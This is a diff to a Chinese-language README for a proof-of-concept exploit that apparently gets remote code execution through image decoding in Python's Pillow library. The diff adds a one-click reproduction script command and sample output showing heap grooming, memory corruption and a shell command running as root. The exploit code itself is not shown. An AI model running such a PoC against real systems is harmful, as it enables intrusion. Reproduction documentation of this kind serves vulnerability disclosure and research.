@@ -19,7 +19,35 @@ readelf -h $(readlink -f $(which python3)) | grep Type          # 期望 EXEC（
 
 ---
 
-## 1. 三条命令复现
+## 1. 一键复现（推荐）
+
+```bash
+bash exp/oneclick.sh
+```
+
+它会依次：检查环境（Python / Pillow / 是否非 PIE）→ 生成恶意图片 → 堆编排 → 解码触发 → 打印关键行 + 判定结论。
+完整日志落在 `/tmp/oneclick_last.log`。
+
+**期望看到**：
+
+```
+==================== 环境检查 ====================
+Python 3.12.3 | Pillow 12.3.0
+  Class:                             ELF64
+  Type:                              EXEC (Executable file)
+==================== 关键输出 ====================
+[i] 相邻对 126/128
+[i] 解码完成
+[+] HIT tuple@0xe73060  item2 = blob(0xd61600) ✓
+uid=0(root) gid=0(root) groups=0(root),3001(android_group_3001),...
+✅ RCE 成立：命令由【图片解码过程】写坏内存后执行（上面 uid= 那行）
+```
+
+> 脚本末尾进程会因为"命令已执行、解释器状态被破坏"而崩掉 —— **属预期**，`uid=` 已经打印出来了。
+
+---
+
+## 2. 手动三步复现（想看清每一步时用）
 
 ```bash
 # ① 进入 PoC 目录（仓库里的 exp/）
